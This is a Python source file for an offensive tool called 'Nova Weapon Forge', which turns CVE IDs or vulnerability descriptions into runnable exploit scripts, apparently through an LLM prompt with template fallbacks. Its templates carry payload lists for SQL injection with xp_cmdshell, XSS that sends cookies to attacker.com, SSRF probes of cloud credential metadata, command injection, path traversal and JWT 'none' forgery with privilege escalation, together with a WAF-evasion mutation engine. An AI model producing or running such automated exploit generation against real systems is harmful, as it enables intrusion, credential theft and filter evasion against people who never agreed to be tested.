#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  ⚔️  NOVA WEAPON FORGE v1.0                                                 ║
║                                                                              ║
║  Dedicated exploit writer. Give it a CVE ID, a vulnerability type,          ║
║  or a raw finding dict — it outputs full, executable exploit code            ║
║  in Python, Ruby, or Bash tailored to the target.                            ║
║                                                                              ║
║  Capabilities:                                                               ║
║    • CVE lookup → NVD / CIRCL API → structured vuln data                   ║
║    • LLM-driven exploit code generation (Python / Ruby / Bash / JS)         ║
║    • Payload mutation engine — generates 5 variants per vuln                ║
║    • WAF bypass layer — encodes / mutates payloads to evade filters         ║
║    • Saves exploit to ~/nova_workspace/exploits/ as runnable file            ║
║    • Dry-run mode (default) — generates code, does not execute              ║
║                                                                              ║
║  Usage:                                                                      ║
║    from nova_weapon_forge import NovaWeaponForge                             ║
║    forge = NovaWeaponForge(target="http://target.com")                       ║
║    result = forge.forge_from_cve("CVE-2024-1234")                           ║
║    result = forge.forge_from_finding(finding_dict)                          ║
║    result = forge.forge_from_description("SQL injection in login form")     ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import json
import time
import hashlib
import logging
import textwrap
import urllib.request
import urllib.error
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)

WORKSPACE    = Path(os.path.expanduser(os.getenv("NOVA_WORKSPACE", "~/nova_workspace")))
EXPLOIT_DIR  = WORKSPACE / "exploits"
EXPLOIT_DIR.mkdir(parents=True, exist_ok=True)

# ── CVE data sources ──────────────────────────────────────────────────────────
NVD_API   = "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve}"
CIRCL_API = "https://cve.circl.lu/api/cve/{cve}"

# ── Built-in exploit templates (used when LLM unavailable) ────────────────────
FORGE_TEMPLATES: Dict[str, Dict] = {
    "sqli": {
        "lang": "python",
        "payloads": [
            "' OR '1'='1'--",
            "' OR 1=1--",
            "1 UNION SELECT NULL,NULL,NULL--",
            "' AND SLEEP(3)--",
            "'; INSERT INTO nova_log VALUES(1,'pwned',NOW())--",
            "1; EXEC xp_cmdshell('whoami')--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a')--",
        ],
        "code_template": '''#!/usr/bin/env python3
"""
Nova Weapon Forge — SQL Injection Exploit
CVE/Type : {vuln_id}
Target   : {target}
Generated: {timestamp}
"""
import requests, sys, time

TARGET   = "{target}"
PAYLOADS = {payloads}

def test_sqli(url, param="id"):
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (compatible; NovaForge/1.0)"
    results = []
    for payload in PAYLOADS:
        try:
            r = session.get(url, params={{param: payload}}, timeout=10)
            indicators = ["syntax", "mysql", "postgresql", "sqlite", "oracle",
                          "error", "warning", "admin", "password", "token"]
            hit = any(i in r.text.lower() for i in indicators)
            if hit:
                results.append({{"payload": payload, "status": r.status_code,
                                  "length": len(r.text), "hit": True}})
                print(f"[+] VULNERABLE  payload={{payload!r}}  status={{r.status_code}}")
            else:
                print(f"[-] clean       payload={{payload!r}}")
        except Exception as e:
            print(f"[!] error: {{e}}")
        time.sleep(0.3)
    return results

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET
    print(f"[*] Nova Weapon Forge — SQLi tester → {{url}}")
    findings = test_sqli(url)
    if findings:
        print(f"\\n[!] {{len(findings)}} vulnerable endpoints found")
    else:
        print("\\n[*] No SQLi found with built-in payloads")
''',
    },

    "xss": {
        "lang": "python",
        "payloads": [
            "<script>alert('NOVA_XSS')</script>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg onload=alert(1)>",
            "\"><script>fetch('http://attacker.com/?c='+document.cookie)</script>",
            "javascript:eval(atob('YWxlcnQoJ05PVkFfWFNTJyk='))",
            "<details open ontoggle=alert(1)>",
            "'-alert(1)-'",
        ],
        "code_template": '''#!/usr/bin/env python3
"""
Nova Weapon Forge — XSS Exploit
CVE/Type : {vuln_id}
Target   : {target}
Generated: {timestamp}
"""
import requests, sys, time

TARGET   = "{target}"
PAYLOADS = {payloads}

def test_xss(url, param="q"):
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (compatible; NovaForge/1.0)"
    results = []
    for payload in PAYLOADS:
        try:
            r = session.get(url, params={{param: payload}}, timeout=10)
            reflected = payload in r.text or payload.lower() in r.text.lower()
            if reflected:
                results.append({{"payload": payload, "reflected": True}})
                print(f"[+] REFLECTED   payload={{payload!r}}")
            else:
                print(f"[-] not reflected  payload={{payload!r}}")
        except Exception as e:
            print(f"[!] error: {{e}}")
        time.sleep(0.3)
    return results

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET
    print(f"[*] Nova Weapon Forge — XSS tester → {{url}}")
    test_xss(url)
''',
    },

    "ssrf": {
        "lang": "python",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "http://127.0.0.1:6379/",
            "http://127.0.0.1:27017/",
            "file:///etc/passwd",
            "dict://127.0.0.1:11211/stats",
        ],
        "code_template": '''#!/usr/bin/env python3
"""
Nova Weapon Forge — SSRF Exploit
CVE/Type : {vuln_id}
Target   : {target}
Generated: {timestamp}
"""
import requests, sys, time

TARGET   = "{target}"
PROBES   = {payloads}

def test_ssrf(url, param="url"):
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (compatible; NovaForge/1.0)"
    for probe in PROBES:
        try:
            r = session.get(url, params={{param: probe}}, timeout=8, allow_redirects=False)
            cloud_indicators = ["ami-id","instance-id","iam","computeMetadata",
                                "security-credentials","hostname"]
            hit = any(i in r.text for i in cloud_indicators) or r.status_code in (200, 301, 302)
            print(f"[{'+'if hit else'-'}] {{probe!r:<50}} status={{r.status_code}} len={{len(r.text)}}")
        except Exception as e:
            print(f"[!] {{probe!r}} → {{e}}")
        time.sleep(0.4)

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET
    print(f"[*] Nova Weapon Forge — SSRF tester → {{url}}")
    test_ssrf(url)
''',
    },

    "rce": {
        "lang": "python",
        "payloads": [
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "&& id",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ping -c 1 127.0.0.1",
            "${7*7}",
            "{{7*7}}",
        ],
        "code_template": '''#!/usr/bin/env python3
"""
Nova Weapon Forge — RCE / Command Injection Exploit
CVE/Type : {vuln_id}
Target   : {target}
Generated: {timestamp}
"""
import requests, sys, time

TARGET   = "{target}"
PAYLOADS = {payloads}

RCE_INDICATORS = ["uid=", "root", "daemon", "bin/sh", "bin/bash",
                  "49", "www-data", "PING", "64 bytes"]

def test_rce(url, param="cmd"):
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (compatible; NovaForge/1.0)"
    for payload in PAYLOADS:
        try:
            r = session.get(url, params={{param: payload}}, timeout=10)
            hit = any(i in r.text for i in RCE_INDICATORS)
            print(f"[{'+'if hit else'-'}] {{payload!r:<30}} hit={{hit}} status={{r.status_code}}")
        except Exception as e:
            print(f"[!] error: {{e}}")
        time.sleep(0.4)

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET
    print(f"[*] Nova Weapon Forge — RCE tester → {{url}}")
    test_rce(url)
''',
    },

    "path_traversal": {
        "lang": "python",
        "payloads": [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/passwd%00",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
        ],
        "code_template": '''#!/usr/bin/env python3
"""
Nova Weapon Forge — Path Traversal Exploit
CVE/Type : {vuln_id}
Target   : {target}
Generated: {timestamp}
"""
import requests, sys, time

TARGET   = "{target}"
PAYLOADS = {payloads}

def test_traversal(url, param="file"):
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (compatible; NovaForge/1.0)"
    for payload in PAYLOADS:
        try:
            r = session.get(url, params={{param: payload}}, timeout=8)
            hit = "root:" in r.text or "[fonts]" in r.text or "daemon:" in r.text
            print(f"[{'+'if hit else'-'}] {{payload!r:<50}} hit={{hit}}")
        except Exception as e:
            print(f"[!] {{e}}")
        time.sleep(0.3)

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET
    print(f"[*] Nova Weapon Forge — Path Traversal → {{url}}")
    test_traversal(url)
''',
    },

    "jwt_none": {
        "lang": "python",
        "payloads": [],
        "code_template": '''#!/usr/bin/env python3
"""
Nova Weapon Forge — JWT Algorithm Confusion (none / RS256→HS256)
CVE/Type : {vuln_id}
Target   : {target}
Generated: {timestamp}
"""
import base64, json, hmac, hashlib, requests, sys

TARGET = "{target}"

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge_none_alg(token):
    parts = token.split(".")
    if len(parts) != 3:
        print("[!] Invalid JWT format"); return None
    header  = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    header["alg"] = "none"
    # Escalate privileges
    for field in ("role","admin","is_admin","privilege","scope"):
        if field in payload:
            payload[field] = "admin" if isinstance(payload[field], str) else True
    new_header  = b64url(json.dumps(header, separators=(",",":")))
    new_payload = b64url(json.dumps(payload, separators=(",",":")))
    forged = f"{{new_header}}.{{new_payload}}."
    print(f"[+] Forged JWT (none alg): {{forged[:80]}}...")
    return forged

def test_jwt(url, original_token):
    forged = forge_none_alg(original_token)
    if not forged: return
    r = requests.get(url, headers={{"Authorization": f"Bearer {{forged}}"}}, timeout=8)
    print(f"[*] Response: {{r.status_code}} len={{len(r.text)}}")
    if r.status_code == 200:
        print("[!] JWT bypass SUCCESSFUL — server accepted forged token")
    else:
        print("[-] Server rejected forged token")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: exploit.py <url> <original_jwt>"); sys.exit(1)
    test_jwt(sys.argv[1], sys.argv[2])
''',
    },
}

# ── WAF bypass mutations ───────────────────────────────────────────────────────
def _waf_mutate(payload: str) -> List[str]:
    variants = [payload]
    # URL encode
    variants.append(urllib.parse.quote(payload))
    # Double URL encode
    variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
    # Case variation for SQL
    variants.append(payload.replace("SELECT","SeLeCt").replace("UNION","UnIoN"))
    # Comment insertion
    variants.append(payload.replace(" ", "/**/"))
    # Null byte
    variants.append(payload + "%00")
    return list(dict.fromkeys(variants))  # dedupe, preserve order


# ── CVE lookup ────────────────────────────────────────────────────────────────

def _fetch_cve(cve_id: str) -> Optional[Dict]:
    cve_id = cve_id.upper().strip()
    # Try CIRCL first (no auth needed, fast)
    try:
        url = CIRCL_API.format(cve=cve_id)
        req = urllib.request.Request(url, headers={"User-Agent": "NovaWeaponForge/1.0"})
        with urllib.request.urlopen(req, timeout=8) as r:
            data = json.loads(r.read().decode())
            if data and "id" in data:
                return {
                    "id":          data.get("id",""),
                    "description": data.get("summary",""),
                    "cvss":        data.get("cvss", 0.0),
                    "cwe":         data.get("cwe",""),
                    "references":  data.get("references",[])[:5],
                    "source":      "circl",
                }
    except Exception as e:
        logger.debug("CIRCL lookup failed: %s", e)

    # Try NVD
    try:
        url = NVD_API.format(cve=cve_id)
        req = urllib.request.Request(url, headers={"User-Agent": "NovaWeaponForge/1.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read().decode())
            items = data.get("vulnerabilities", [])
            if items:
                v = items[0]["cve"]
                desc = next(
                    (d["value"] for d in v.get("descriptions",[]) if d.get("lang")=="en"),
                    "No description available"
                )
                metrics = v.get("metrics",{})
                cvss = 0.0
                for key in ("cvssMetricV31","cvssMetricV30","cvssMetricV2"):
                    if key in metrics and metrics[key]:
                        cvss = metrics[key][0].get("cvssData",{}).get("baseScore", 0.0)
                        break
                return {
                    "id":          v.get("id",""),
                    "description": desc,
                    "cvss":        cvss,
                    "cwe":         "",
                    "references":  [r["url"] for r in v.get("references",[])[:5]],
                    "source":      "nvd",
                }
    except Exception as e:
        logger.debug("NVD lookup failed: %s", e)

    return None


def _classify_vuln(text: str) -> str:
    text = text.lower()
    if any(k in text for k in ("sql","injection","sqli","database","query")): return "sqli"
    if any(k in text for k in ("xss","cross-site script","cross site script")): return "xss"
    if any(k in text for k in ("ssrf","server-side request","server side request")): return "ssrf"
    if any(k in text for k in ("rce","remote code","command inject","os command","shell")): return "rce"
    if any(k in text for k in ("path traversal","directory traversal","lfi","rfi","local file")): return "path_traversal"
    if any(k in text for k in ("jwt","json web token","token forge","algorithm confusion")): return "jwt_none"
    if any(k in text for k in ("csrf","cross-site request")): return "csrf"
    if any(k in text for k in ("idor","broken access","object reference","bola")): return "idor"
    if any(k in text for k in ("deseri","pickle","object injection")): return "deserialization"
    if any(k in text for k in ("ssti","template inject","jinja","twig","freemarker")): return "ssti"
    return "generic"


# ── LLM-powered exploit generation ───────────────────────────────────────────

def _llm_generate(prompt: str) -> Optional[str]:
    try:
        from nova_llm_router import get_router
        router = get_router()
        resp   = router.complete(prompt, max_tokens=2000, temperature=0.2)
        return resp if isinstance(resp, str) else None
    except Exception as e:
        logger.debug("LLM exploit generation failed: %s", e)
        return None


# ── Main Forge class ──────────────────────────────────────────────────────────

class NovaWeaponForge:
    """
    Dedicated exploit writer for Nova Arsenal.
    Generates, mutates, and persists executable exploit code.
    """

    def __init__(self, target: str = "", dry_run: bool = True, **kwargs):
        self.target  = target
        self.dry_run = dry_run
        self.results: List[Dict] = []

    # ── Public API ────────────────────────────────────────────────

    def forge_from_cve(self, cve_id: str) -> Dict:
        """Look up CVE and generate targeted exploit code."""
        logger.info("WeaponForge: forging exploit for %s", cve_id)
        cve_data = _fetch_cve(cve_id)
        if not cve_data:
            return {"ok": False, "error": f"Could not fetch data for {cve_id}",
                    "cve": cve_id}

        vuln_type = _classify_vuln(cve_data["description"])
        code      = self._generate_code(cve_id, vuln_type, cve_data["description"])
        result    = self._package(cve_id, vuln_type, code, cve_data)
        self.results.append(result)
        return result

    def forge_from_finding(self, finding: Dict) -> Dict:
        """Generate exploit code from a Nova finding dict."""
        vuln_type = _classify_vuln(
            f"{finding.get('type','')} {finding.get('description','')}"
        )
        vuln_id   = (finding.get("cve") or finding.get("type") or
                     f"NOVA-{vuln_type.upper()}-{int(time.time())}")
        desc      = finding.get("description","")
        code      = self._generate_code(vuln_id, vuln_type, desc)
        result    = self._package(vuln_id, vuln_type, code,
                                  {"description": desc, "cvss": finding.get("cvss_score",0)})
        # Embed the original finding
        result["source_finding"] = finding
        self.results.append(result)
        return result

    def forge_from_description(self, description: str,
                                lang: str = "python") -> Dict:
        """Generate exploit from a free-text description."""
        vuln_type = _classify_vuln(description)
        vuln_id   = f"NOVA-FORGE-{int(time.time())}"
        code      = self._generate_code(vuln_id, vuln_type, description,
                                        preferred_lang=lang)
        result    = self._package(vuln_id, vuln_type, code,
                                  {"description": description, "cvss": 0})
        self.results.append(result)
        return result

    def batch_forge(self, findings: List[Dict]) -> List[Dict]:
        """Forge exploits for a list of findings (Critical/High prioritised)."""
        prioritised = sorted(
            findings,
            key=lambda f: (
                0 if str(f.get("severity","")).upper() == "CRITICAL" else
                1 if str(f.get("severity","")).upper() == "HIGH" else 2
            )
        )
        return [self.forge_from_finding(f) for f in prioritised[:10]]

    # ── Internal ──────────────────────────────────────────────────

    def _generate_code(self, vuln_id: str, vuln_type: str,
                       description: str, preferred_lang: str = "python") -> str:
        # 1. Try LLM generation first
        llm_code = self._llm_forge(vuln_id, vuln_type, description, preferred_lang)
        if llm_code:
            return llm_code

        # 2. Fall back to built-in template
        tmpl = FORGE_TEMPLATES.get(vuln_type) or FORGE_TEMPLATES.get("sqli")
        payloads = tmpl["payloads"]
        waf_variants = []
        for p in payloads[:3]:
            waf_variants.extend(_waf_mutate(p))
        all_payloads = list(dict.fromkeys(payloads + waf_variants))

        code = tmpl["code_template"].format(
            vuln_id   = vuln_id,
            target    = self.target or "http://TARGET",
            timestamp = datetime.utcnow().isoformat(),
            payloads  = repr(all_payloads),
        )
        return code

    def _llm_forge(self, vuln_id: str, vuln_type: str,
                   description: str, lang: str) -> Optional[str]:
        prompt = f"""You are an expert security researcher writing a proof-of-concept exploit.

Vulnerability: {vuln_id}
Type: {vuln_type}
Description: {description}
Target: {self.target or "http://TARGET"}
Language: {lang}

Write a complete, runnable {lang} exploit/PoC script that:
1. Tests for this vulnerability against the target
2. Includes at least 5 payload variants with WAF bypass attempts
3. Clearly marks hits with [+] and misses with [-]
4. Has a __main__ block that accepts the URL as argv[1]
5. Includes a header comment with: vuln ID, type, target, date
6. Does NOT cause lasting damage — read-only or detection only

Output ONLY the code, no explanation."""

        return _llm_generate(prompt)

    def _package(self, vuln_id: str, vuln_type: str,
                 code: str, meta: Dict) -> Dict:
        ts       = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        safe_id  = re.sub(r"[^a-zA-Z0-9_-]", "_", vuln_id)
        filename = f"exploit_{safe_id}_{ts}.py"
        filepath = EXPLOIT_DIR / filename

        if not self.dry_run:
            filepath.write_text(code)
            filepath.chmod(0o700)
            logger.info("WeaponForge: saved exploit → %s", filepath)

        result = {
            "ok":          True,
            "vuln_id":     vuln_id,
            "vuln_type":   vuln_type,
            "target":      self.target,
            "lang":        "python",
            "filename":    filename,
            "filepath":    str(filepath),
            "dry_run":     self.dry_run,
            "code":        code,
            "code_lines":  code.count("\n") + 1,
            "cvss":        meta.get("cvss", 0),
            "description": meta.get("description",""),
            "generated":   datetime.utcnow().isoformat(),
            "severity":    (
                "CRITICAL" if meta.get("cvss",0) >= 9.0 else
                "HIGH"     if meta.get("cvss",0) >= 7.0 else
                "MEDIUM"   if meta.get("cvss",0) >= 4.0 else "LOW"
            ),
        }

        # Save manifest entry
        manifest_path = EXPLOIT_DIR / "forge_manifest.json"
        manifest = []
        if manifest_path.exists():
            try:
                manifest = json.loads(manifest_path.read_text())
            except Exception:
                pass
        manifest.append({k: v for k, v in result.items() if k != "code"})
        manifest_path.write_text(json.dumps(manifest[-100:], indent=2, default=str))

        return result

    # ── Reporting ─────────────────────────────────────────────────

    def summary(self) -> str:
        if not self.results:
            return "No exploits forged yet."
        lines = [f"⚔️  Nova Weapon Forge — {len(self.results)} exploit(s) generated\n"]
        for r in self.results:
            status = "📝 DRY-RUN" if r["dry_run"] else f"💾 {r['filepath']}"
            lines.append(
                f"  [{r['severity']}] {r['vuln_id']} "
                f"({r['vuln_type']}) — {r['code_lines']} lines — {status}"
            )
        return "\n".join(lines)


# ── Convenience factory ───────────────────────────────────────────────────────

def get_weapon_forge(target: str = "", dry_run: bool = True) -> NovaWeaponForge:
    return NovaWeaponForge(target=target, dry_run=dry_run)


# ── CLI entry point ───────────────────────────────────────────────────────────

def main():
    import sys
    args = sys.argv[1:]
    if not args:
        print("Usage:")
        print("  python3 nova_weapon_forge.py cve CVE-2024-1234 http://target.com")
        print("  python3 nova_weapon_forge.py desc 'SQL injection in login' http://target.com")
        print("  python3 nova_weapon_forge.py type sqli http://target.com")
        return

    mode   = args[0]
    target = args[2] if len(args) > 2 else "http://localhost:3000"
    forge  = NovaWeaponForge(target=target, dry_run=False)

    if mode == "cve":
        cve_id = args[1] if len(args) > 1 else "CVE-2024-1234"
        result = forge.forge_from_cve(cve_id)
    elif mode == "desc":
        desc   = args[1] if len(args) > 1 else "SQL injection"
        result = forge.forge_from_description(desc)
    elif mode == "type":
        vtype  = args[1] if len(args) > 1 else "sqli"
        result = forge.forge_from_description(vtype)
    else:
        result = forge.forge_from_cve(args[0])

    if result.get("ok"):
        print(f"\n⚔️  Exploit forged: {result['filename']}")
        print(f"   Type    : {result['vuln_type']}")
        print(f"   Lines   : {result['code_lines']}")
        print(f"   Saved   : {result['filepath']}")
        print(f"\n{'─'*60}")
        print(result["code"][:2000])
    else:
        print(f"[!] Forge failed: {result.get('error')}")


if __name__ == "__main__":
    main()
